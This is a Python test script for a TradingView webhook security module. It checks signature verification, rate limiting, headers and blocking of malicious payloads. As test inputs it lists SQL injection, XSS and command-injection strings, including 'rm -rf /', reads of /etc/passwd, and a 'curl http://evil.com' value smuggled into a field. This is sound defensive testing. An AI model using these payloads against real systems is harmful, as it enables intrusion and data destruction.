#!/usr/bin/env python3
"""
Test script for TradingView webhook security and validation
"""

import asyncio
import json
import logging
import hmac
import hashlib
from decimal import Decimal
import time
from typing import Dict, Any
import requests

# Add src to path
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from backend.webhooks.security import (
    verify_webhook_signature,
    generate_webhook_secret,
    webhook_security_validator,
    webhook_rate_limiter,
    validate_webhook_headers
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def test_signature_verification():
    """Test HMAC signature verification"""
    print("🔐 Testing HMAC Signature Verification...")
    
    # Generate test secret and payload
    secret = generate_webhook_secret()
    payload = json.dumps({"symbol": "ES", "action": "buy", "quantity": 1})
    body = payload.encode('utf-8')
    
    # Generate valid signature
    valid_signature = hmac.new(
        secret.encode('utf-8'),
        body,
        hashlib.sha256
    ).hexdigest()
    
    # Test valid signature
    is_valid = verify_webhook_signature(body, valid_signature, secret)
    assert is_valid, "Valid signature should be verified"
    print("   ✅ Valid signature verification: PASSED")
    
    # Test invalid signature
    invalid_signature = "invalid_signature_here"
    is_valid = verify_webhook_signature(body, invalid_signature, secret)
    assert not is_valid, "Invalid signature should be rejected"
    print("   ✅ Invalid signature rejection: PASSED")
    
    # Test missing parameters
    is_valid = verify_webhook_signature(b"", "", "")
    assert not is_valid, "Empty parameters should be rejected"
    print("   ✅ Empty parameters rejection: PASSED")
    
    print("   📊 Signature verification tests: ALL PASSED")
    return True


def test_payload_security_validation():
    """Test security validation for malicious payloads"""
    print("\n🛡️  Testing Payload Security Validation...")
    
    # Test clean payload
    clean_payload = {
        "symbol": "ES",
        "action": "buy", 
        "quantity": 2,
        "price": 4500.0,
        "strategy": "momentum_strategy"
    }
    
    is_safe, issue = webhook_security_validator.validate_payload_security(clean_payload)
    assert is_safe, f"Clean payload should be safe: {issue}"
    print("   ✅ Clean payload validation: PASSED")
    
    # Test SQL injection attempts
    sql_injection_payloads = [
        {"symbol": "ES'; DROP TABLE users; --", "action": "buy"},
        {"action": "UNION SELECT * FROM accounts"},
        {"comment": "test' OR 1=1 --"}
    ]
    
    sql_injection_blocked = 0
    for payload in sql_injection_payloads:
        is_safe, issue = webhook_security_validator.validate_payload_security(payload)
        if not is_safe:
            sql_injection_blocked += 1
    
    assert sql_injection_blocked > 0, "SQL injection attempts should be blocked"
    print(f"   ✅ SQL injection blocking: {sql_injection_blocked}/{len(sql_injection_payloads)} PASSED")
    
    # Test XSS attempts
    xss_payloads = [
        {"symbol": "<script>alert('xss')</script>", "action": "buy"},
        {"comment": "javascript:alert('test')"},
        {"strategy": "data:text/html,<script>alert(1)</script>"}
    ]
    
    xss_blocked = 0
    for payload in xss_payloads:
        is_safe, issue = webhook_security_validator.validate_payload_security(payload)
        if not is_safe:
            xss_blocked += 1
    
    assert xss_blocked > 0, "XSS attempts should be blocked"
    print(f"   ✅ XSS blocking: {xss_blocked}/{len(xss_payloads)} PASSED")
    
    # Test command injection attempts
    command_injection_payloads = [
        {"symbol": "ES; rm -rf /", "action": "buy"},
        {"comment": "test | cat /etc/passwd"},
        {"strategy": "$(whoami)"}
    ]
    
    command_injection_blocked = 0
    for payload in command_injection_payloads:
        is_safe, issue = webhook_security_validator.validate_payload_security(payload)
        if not is_safe:
            command_injection_blocked += 1
    
    assert command_injection_blocked > 0, "Command injection attempts should be blocked"
    print(f"   ✅ Command injection blocking: {command_injection_blocked}/{len(command_injection_payloads)} PASSED")
    
    print("   📊 Security validation tests: ALL PASSED")
    return True


def test_tradingview_field_validation():
    """Test TradingView-specific field validation"""
    print("\n📋 Testing TradingView Field Validation...")
    
    # Test valid TradingView payload
    valid_payload = {
        "symbol": "ES",
        "action": "buy",
        "quantity": 2,
        "price": 4500.0,
        "timestamp": int(time.time()),
        "strategy": "momentum_test"
    }
    
    is_valid, error = webhook_security_validator.validate_tradingview_fields(valid_payload)
    assert is_valid, f"Valid payload should pass: {error}"
    print("   ✅ Valid TradingView payload: PASSED")
    
    # Test missing required fields
    incomplete_payloads = [
        {"action": "buy"},  # Missing symbol
        {"symbol": "ES"},   # Missing action
        {}                  # Missing both
    ]
    
    missing_field_rejections = 0
    for payload in incomplete_payloads:
        is_valid, error = webhook_security_validator.validate_tradingview_fields(payload)
        if not is_valid:
            missing_field_rejections += 1
    
    assert missing_field_rejections == len(incomplete_payloads), "Incomplete payloads should be rejected"
    print(f"   ✅ Missing field rejection: {missing_field_rejections}/{len(incomplete_payloads)} PASSED")
    
    # Test invalid field values
    invalid_payloads = [
        {"symbol": "ES", "action": "buy", "quantity": -1},        # Negative quantity
        {"symbol": "ES", "action": "buy", "quantity": 10000},     # Excessive quantity  
        {"symbol": "ES", "action": "buy", "price": -100},         # Negative price
        {"symbol": "ES", "action": "buy", "price": 10000000},     # Excessive price
        {"symbol": "VERY_LONG_SYMBOL_NAME_HERE", "action": "buy"}, # Long symbol
        {"symbol": "ES@#$%", "action": "buy"},                    # Invalid symbol chars
        {"symbol": "ES", "action": "invalid_action"}              # Invalid action
    ]
    
    invalid_value_rejections = 0
    for payload in invalid_payloads:
        is_valid, error = webhook_security_validator.validate_tradingview_fields(payload)
        if not is_valid:
            invalid_value_rejections += 1
    
    assert invalid_value_rejections > 0, "Invalid values should be rejected"
    print(f"   ✅ Invalid value rejection: {invalid_value_rejections}/{len(invalid_payloads)} PASSED")
    
    print("   📊 TradingView field validation tests: ALL PASSED")
    return True


def test_rate_limiting():
    """Test webhook rate limiting"""
    print("\n🚦 Testing Rate Limiting...")
    
    # Create test rate limiter with low limits for testing
    test_rate_limiter = type(webhook_rate_limiter)(max_requests=5, window_minutes=1)
    
    test_ip = "192.168.1.100"
    
    # Test normal usage (should be allowed)
    requests_allowed = 0
    for i in range(3):
        if test_rate_limiter.is_allowed(test_ip):
            requests_allowed += 1
    
    assert requests_allowed == 3, "Normal usage should be allowed"
    print("   ✅ Normal usage allowance: PASSED")
    
    # Test rate limit enforcement (flood with requests)
    flood_blocked = 0
    for i in range(10):  # Try 10 more requests (total 13, limit is 5)
        if not test_rate_limiter.is_allowed(test_ip):
            flood_blocked += 1
    
    assert flood_blocked > 0, "Flood requests should be blocked"
    print(f"   ✅ Rate limit enforcement: {flood_blocked}/10 blocked PASSED")
    
    # Test different IPs (should be independent)
    different_ip = "192.168.1.101"
    different_ip_allowed = test_rate_limiter.is_allowed(different_ip)
    assert different_ip_allowed, "Different IPs should have independent limits"
    print("   ✅ Independent IP limits: PASSED")
    
    print("   📊 Rate limiting tests: ALL PASSED")
    return True


def test_header_validation():
    """Test HTTP header validation"""
    print("\n📨 Testing Header Validation...")
    
    # Test valid headers
    valid_headers = {
        "content-type": "application/json",
        "user-agent": "TradingView-Webhook/1.0"
    }
    
    is_valid, error = validate_webhook_headers(valid_headers)
    assert is_valid, f"Valid headers should pass: {error}"
    print("   ✅ Valid headers: PASSED")
    
    # Test missing content-type
    missing_content_type = {
        "user-agent": "TradingView-Webhook/1.0"
    }
    
    is_valid, error = validate_webhook_headers(missing_content_type)
    assert not is_valid, "Missing content-type should be rejected"
    print("   ✅ Missing content-type rejection: PASSED")
    
    # Test invalid content-type
    invalid_content_type = {
        "content-type": "text/plain",
        "user-agent": "TradingView-Webhook/1.0"
    }
    
    is_valid, error = validate_webhook_headers(invalid_content_type)
    assert not is_valid, "Invalid content-type should be rejected"
    print("   ✅ Invalid content-type rejection: PASSED")
    
    # Test suspicious headers (should log warning but not fail)
    suspicious_headers = {
        "content-type": "application/json",
        "x-forwarded-host": "evil.com",
        "user-agent": "SuspiciousBot/1.0"
    }
    
    is_valid, error = validate_webhook_headers(suspicious_headers)
    # Should pass but log warnings
    assert is_valid, "Suspicious headers should pass but log warnings"
    print("   ✅ Suspicious header detection: PASSED")
    
    print("   📊 Header validation tests: ALL PASSED")
    return True


def run_webhook_security_stress_test():
    """Run stress test with various attack scenarios"""
    print("\n💥 Running Webhook Security Stress Test...")
    
    attack_scenarios = [
        # Oversized payloads
        {"symbol": "A" * 1000, "action": "buy"},
        
        # Nested injection attempts
        {
            "symbol": "ES",
            "action": "buy",
            "metadata": {
                "comment": "'; DROP TABLE alerts; --",
                "nested": {
                    "deep_injection": "<script>alert('nested')</script>"
                }
            }
        },
        
        # Unicode and encoding attacks
        {"symbol": "ES\x00\x01\x02", "action": "buy"},
        {"symbol": "ES\u0000", "action": "buy"},
        
        # Large numbers
        {"symbol": "ES", "action": "buy", "quantity": 999999999999999999},
        {"symbol": "ES", "action": "buy", "price": 1e20},
        
        # Special characters
        {"symbol": "ES/../../../etc/passwd", "action": "buy"},
        {"symbol": "ES", "action": "buy&curl http://evil.com"},
    ]
    
    threats_blocked = 0
    total_tests = len(attack_scenarios)
    
    for i, scenario in enumerate(attack_scenarios):
        print(f"   Testing attack scenario {i+1}/{total_tests}...")
        
        # Test security validation
        is_safe, security_issue = webhook_security_validator.validate_payload_security(scenario)
        if not is_safe:
            threats_blocked += 1
            print(f"     🛡️  Blocked: {security_issue}")
            continue
        
        # Test field validation
        is_valid, validation_error = webhook_security_validator.validate_tradingview_fields(scenario)
        if not is_valid:
            threats_blocked += 1
            print(f"     🛡️  Blocked: {validation_error}")
    
    block_rate = (threats_blocked / total_tests) * 100
    print(f"\n   📊 Stress test results: {threats_blocked}/{total_tests} threats blocked ({block_rate:.1f}%)")
    
    # Require at least 70% block rate
    assert block_rate >= 70, f"Block rate too low: {block_rate}%"
    print("   ✅ Stress test: PASSED")
    
    return True


async def main():
    """Main test function"""
    print("=" * 60)
    print("TRADINGVIEW WEBHOOK SECURITY VALIDATION")
    print("=" * 60)
    
    all_tests_passed = True
    
    try:
        # Run all security tests
        tests = [
            test_signature_verification,
            test_payload_security_validation,
            test_tradingview_field_validation,
            test_rate_limiting,
            test_header_validation,
            run_webhook_security_stress_test
        ]
        
        for test_func in tests:
            try:
                result = test_func()
                if not result:
                    all_tests_passed = False
            except Exception as e:
                logger.error(f"Test {test_func.__name__} failed: {e}")
                all_tests_passed = False
        
        # Final validation
        print(f"\n{'='*60}")
        if all_tests_passed:
            print("🎯 WEBHOOK SECURITY VALIDATION: ✅ ALL TESTS PASSED")
            print("🔐 Security enhancements validated:")
            print("   • HMAC signature verification")
            print("   • SQL injection protection") 
            print("   • XSS attack prevention")
            print("   • Command injection blocking")
            print("   • Rate limiting enforcement")
            print("   • Header validation")
            print("   • Field validation")
            print("   • Stress test resilience")
        else:
            print("❌ WEBHOOK SECURITY VALIDATION: TESTS FAILED")
        print(f"{'='*60}")
        
        return all_tests_passed
        
    except Exception as e:
        logger.error(f"Test suite failed: {e}")
        return False


if __name__ == "__main__":
    success = asyncio.run(main())
    exit(0 if success else 1)